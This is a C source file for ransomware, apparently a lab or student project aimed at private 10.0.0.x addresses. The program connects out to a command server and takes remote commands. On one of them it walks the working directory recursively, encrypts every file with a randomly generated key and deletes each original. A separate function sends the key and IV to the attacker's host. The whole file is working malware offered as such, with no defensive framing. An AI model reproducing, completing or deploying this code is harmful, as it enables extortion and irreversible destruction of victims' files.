#include "ransomlib.h"
#include <dirent.h>
#include <sys/socket.h>
#include <unistd.h> 
#include <arpa/inet.h>
#include <openssl/rand.h>
#include <stdio.h>

void usage();

int is_encrypted(char *filename);

void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag);

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv);

int send_key(char *pKey, char *pIv);

int main (int argc, char * argv[])
{
    int sockid;
    int server_port = 8888;
    char *server_ip = "10.0.0.2";

    sockid = socket(AF_INET, SOCK_STREAM,0);

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    server_addr.sin_addr.s_addr = inet_addr(server_ip);

    struct sockaddr_in client_addr;
    client_addr.sin_family = AF_INET;
    client_addr.sin_port = htons(5555);
    client_addr.sin_addr.s_addr = inet_addr("10.0.0.1");

    bind(sockid, (struct sockaddr *)&client_addr, sizeof(client_addr));
    connect(sockid, (struct sockaddr *)&server_addr, sizeof(server_addr));
	
    char command[512];
    while(1) 
    {
        recv(sockid, command, 512, 0);
        

        if(strncmp(command,"ls",2) == 0)   //Handle ls command
        {
            FILE *out_fp;
            char buffer[1048];
            char path[100000];

            out_fp = popen("/bin/ls", "r");

            fgets(buffer, sizeof(buffer), out_fp);      //put in path the result of ls command line by line
            strcpy(path, buffer);

            while (fgets(buffer, sizeof(buffer), out_fp) != NULL)
            {
                strcat(path, buffer);
            }

        
            

            send(sockid, (const char *)path, strlen(path),0); //send the whole result once
        }
        else if(strncmp(command,"enc",3) ==0)
        {
            FILE *out_fp;
            char workindDirectory[1048];

            out_fp = popen("/bin/pwd", "r");
            fgets(workindDirectory, sizeof(workindDirectory), out_fp);

            unsigned char key[33];
            int sizeKey = 33;
            unsigned char iv[33];
            int sizeIv = 33;
            char pKey[65];
            char pIv[65];
	        int status = generate_key(key, sizeKey, iv, sizeIv, pKey, pIv);
            printf("%s", workindDirectory);
            int size = strcspn(workindDirectory, "\n");
            char stripedWorkingDirectory[1048];                 //stripping \n from the workingDirectory
            strncpy(stripedWorkingDirectory,workindDirectory,size); 

            listdir((const char *)stripedWorkingDirectory, iv, key, 'e');
            
            char response[2048];
            strcpy(response, stripedWorkingDirectory);
            strcat(response, "Encrypted");


            send(sockid, (const char *)response, strlen(response),0);
            
        }
        

    }
	//listdir("/home/victime/important", iv, key, 'e');
    //send_key(pKey, pIv);
}

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv)
{
	RAND_priv_bytes(key, sizeKey);
	RAND_priv_bytes(iv, sizeIv);
	bytes_to_hexa(key, pKey,sizeKey );
	bytes_to_hexa(iv, pIv, sizeKey);
}

void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag)
{
	DIR *dp = opendir(name);
	struct dirent *dirp;

	while((dirp = readdir(dp)) != NULL)
    {
        if(dirp->d_type==DT_DIR && strcmp("..",dirp->d_name) != 0 && strcmp(".",dirp->d_name) != 0 )
        {
            //printf("%s\n", dirp->d_name);
            char *newPath = (char*)malloc(strlen(name)+strlen(dirp->d_name)+2);
            strcpy(newPath,name);
            strncat(newPath,"/",2);
            strncat(newPath,dirp->d_name,strlen(dirp->d_name));
            //printf("%s\n", newPath);
            listdir(newPath,iv, key, 'e');
            free(newPath);
        }

        else if(strcmp("..",dirp->d_name) != 0 && strcmp(".",dirp->d_name) != 0)
        {
            char *filePath = (char*)malloc(strlen(name)+strlen(dirp->d_name)+2);
            strcpy(filePath,name);
            strncat(filePath,"/",2);
            strncat(filePath,dirp->d_name,strlen(dirp->d_name));
            printf("%s\n",filePath);
            if (de_flag == 'e')
            {
                encrypt(key, iv, filePath);
                remove(filePath);
            }
            else 
            {
                decrypt(key, iv, filePath);
                remove(filePath);
            }
            free(filePath);
        }
    }
}


int send_key(char *pKey, char *pIv)
{
    int sockid;
    sockid = socket(AF_INET,SOCK_STREAM,0);

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(4444);
    server_addr.sin_addr.s_addr = inet_addr("10.0.0.2");
    
    char *msg = malloc(strlen(pKey)+strlen(pIv)+2);  // Format du message key:Iv
    strcpy(msg, pKey);
    strcat(msg,":");
    strcat(msg,pIv);

    int status = connect(sockid,(struct sockaddr *)&server_addr, sizeof(server_addr));
    

    send(sockid, (const char *)msg, strlen(msg),0);
    close(sockid);
    free(msg);
}
        
